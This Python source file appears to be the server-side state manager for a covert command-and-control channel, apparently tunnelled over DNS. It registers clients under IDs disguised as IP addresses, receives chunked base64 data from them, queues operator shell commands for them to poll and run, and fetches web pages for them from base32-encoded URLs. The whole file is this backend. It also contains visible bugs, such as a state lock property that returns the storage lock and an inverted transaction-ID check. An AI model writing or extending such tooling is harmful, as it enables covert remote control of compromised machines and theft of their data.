from enum import Enum
from datastorage import ClientStorage, DataStorage
from random import randint
from time import sleep
from collections import defaultdict
import base64
import binascii
import requests
import threading


NOTHING_STR = 'NOTHING'


class StateEnum(Enum):
    IDLE = 'idle'
    RECEIVING_DATA = 'receiving_data'
    RECEIVING_REQUEST = 'receiving_request'
    SENDING_DATA = 'sending_data'
    REQUESTING_SHELL = 'requesting_shell'


class TransmissionTypeEnum(Enum):
    DATA = 'data'
    SHELL = 'shell'


class TransmissionState:

    def __init__(self, data: str, transmission_type: TransmissionTypeEnum):
        self._transmission_type = transmission_type.name
        self._max_msg_index = 255 - len(self._transmission_type) - 1    # 255: maximum message length; -1: space
        self._data = base64.b64encode(f"{data}".encode('utf-8')).decode('utf-8')

    def get_next_data(self):
        if not self._data:
            return ""

        next_data = f"{self._transmission_type} {self._data[:self._max_msg_index]}"
        self._data = self._data[self._max_msg_index:]

        return next_data


class ServerState:

    __NEXT_CLIENT_ID = 1
    __CLIENT_ID_LOCK = threading.Lock()

    def __init__(self):
        self.__state = {}
        self.__storage = {}
        self.__transaction_ids = []
        self.__command_backlog = defaultdict(list)
        self.__requests = []
        self.__responses = []

        self.__state_lock = threading.Lock()
        self.__storage_lock = threading.Lock()
        self.__transaction_ids_lock = threading.Lock()
        self.__command_lock = threading.Lock()
        self.__requests_lock = threading.Lock()
        self.__responses_lock = threading.Lock()

    @property
    def state_lock(self) -> threading.Lock:
        return self.__storage_lock

    @property
    def storage_lock(self) -> threading.Lock:
        return self.__storage_lock

    @property
    def transaction_ids_lock(self) -> threading.Lock:
        return self.__transaction_ids_lock

    @property
    def command_lock(self) -> threading.Lock:
        return self.__command_lock

    @property
    def requests_lock(self) -> threading.Lock:
        return self.__requests_lock

    @property
    def responses_lock(self) -> threading.Lock:
        return self.__responses_lock

    @property
    def state(self) -> dict[int, dict[str, any]]:
        return self.__state

    def set_client_state(self, client_id: int, state: dict[str, any]) -> None:
        with self.__state_lock:
            for k, v in state.items():
                self.__state[client_id][k] = v

    @property
    def storage(self) -> dict[int, ClientStorage]:
        return self.__storage

    def add_storage_head(self, client_id: int, data: str) -> None:
        with self.__storage_lock:
            self.__storage[client_id].store_head(data)

    def add_storage_body(self, client_id: int, data: str, done: bool) -> None:
        with self.__storage_lock:
            self.__storage[client_id].store_body(data, done)

    @property
    def transaction_ids(self) -> list[int]:
        return self.__transaction_ids

    @property
    def command_backlog(self) -> dict[int, list[str]]:
        return self.__command_backlog

    def add_client_command(self, client_id: int, command: str) -> None:
        with self.__command_lock:
            self.__command_backlog[client_id].append(command)

    @property
    def requests(self) -> list[str]:
        return self.__requests

    def add_request(self, request: str) -> None:
        with self.__requests_lock:
            self.__requests.append(request)

    @property
    def responses(self) -> list[str]:
        return self.__responses

    def add_response(self, response: str) -> None:
        with self.__responses_lock:
            self.__responses.append(response)

    def is_new_transaction(self, transaction_id: int) -> bool:
        with self.__transaction_ids_lock:

            is_new = not (transaction_id in self.__transaction_ids)
            if not is_new:
                self.__transaction_ids.append(transaction_id)

        return is_new

    def register_client(self) -> int:
        with self.__CLIENT_ID_LOCK:
            c_id = self.__NEXT_CLIENT_ID
            self.__NEXT_CLIENT_ID += 1

        with self.state_lock:
            self.__state[c_id] = {'state': StateEnum.IDLE,
                                  'transmission': None,
                                  'request': b""}
        with self.storage_lock:
            self.__storage[c_id] = ClientStorage(c_id)

        return c_id


class ServerStateResponseHandler:

    def __init__(self, server_state: ServerState):
        self._server_state = server_state

    def request_id_response(self) -> str:
        c_id = self._server_state.register_client()
        return f"10.{randint(1,255)}.{randint(1,255)}.{c_id}"

    def data_response(self, client_id: int, data: str, is_head: bool, done: bool = False) -> str:
        self._server_state.set_client_state(client_id=client_id, state={'state': StateEnum.RECEIVING_DATA})

        if is_head:
            self._server_state.add_storage_head(client_id=client_id, data=data)
        else:
            self._server_state.add_storage_body(client_id=client_id, data=data, done=done)

        return f"{randint(11,255)}.{randint(1,255)}.{randint(1,255)}.{randint(1,255)}"

    def poll_response(self, client_id: int) -> str:
        with self._server_state.command_lock:
            try:
                shell_command = self._server_state.command_backlog[client_id].pop(0)
            except IndexError:
                shell_command = ""

        if shell_command:
            self._server_state.set_client_state(client_id=client_id, state={'state': StateEnum.REQUESTING_SHELL,
                                                                            'transmission': TransmissionState(shell_command, TransmissionTypeEnum.SHELL)})

            with self._server_state.state_lock:
                result = self._server_state.state[client_id]['transmission'].get_next_data()
        else:
            result = NOTHING_STR

        return result

    def continue_response(self, client_id: int) -> str:
        with self._server_state.state_lock:
            response = self._server_state.state[client_id]['transmission'].get_next_data()

        if not response:
            self._server_state.set_client_state(client_id=client_id, state={'state': StateEnum.IDLE,
                                                                            'transmission': None})
            response = NOTHING_STR

        return response

    def curl_response(self, client_id: int, webpage: str, done: bool) -> str:
        with self._server_state.state_lock:
            current_request = self._server_state.state[client_id]['request']

        self._server_state.set_client_state(client_id=client_id, state={'request': current_request + webpage})

        if done:
            try:
                with self._server_state.state_lock:
                    requested_url = base64.b32decode(self._server_state.state[client_id]['request']).decode('utf-8')

                curl = requests.get(requested_url).text
            except binascii.Error:
                curl = "ENCODING ERROR"

            self._server_state.set_client_state(client_id=client_id, state={'state': StateEnum.SENDING_DATA,
                                                                            'request': b"",
                                                                            'transmission': TransmissionState(curl, TransmissionTypeEnum.DATA)})

            with self._server_state.state_lock:
                result = self._server_state.state[client_id]['transmission'].get_next_data()

            if not result:
                return NOTHING_STR

            return result
        else:
            self._server_state.set_client_state(client_id=client_id, state={'state': StateEnum.RECEIVING_REQUEST})

            return NOTHING_STR


class ServerStateReader:

    def __init__(self, server_state: ServerState):
        self._server_state = server_state

    def get_number_of_clients(self) -> int:
        with self._server_state.state_lock:
            return len(self._server_state.state.keys())

    def get_client_status(self, client_id: int) -> str:
        with self._server_state.state_lock:
            try:
                return self._server_state.state[client_id]['state'].value
            except KeyError:
                return "CLIENT DOES NOT EXIST"

    def get_latest_client_data(self, client_id: int) -> DataStorage:
        with self._server_state.storage_lock:
            try:
                return self._server_state.storage[client_id].get_latest_storage()
            except KeyError:
                return DataStorage("", "")

    def get_next_x_client_commands(self, client_id: int, n_commands: int) -> list[str]:
        with self._server_state.command_lock:
            try:
                return self._server_state.command_backlog[client_id][:n_commands]
            except KeyError:
                return []

    def get_latest_request(self) -> str:
        with self._server_state.requests_lock:
            try:
                return self._server_state.requests[-1]
            except IndexError:
                return ""

    def get_latest_response(self) -> str:
        with self._server_state.responses_lock:
            try:
                return self._server_state.responses[-1]
            except IndexError:
                return ""


class ServerStateCommandWriter:

    def __init__(self, server_state: ServerState):
        self._server_state = server_state

    def write_command(self, client_id: int, command: str):
        self._server_state.add_client_command(client_id, command)
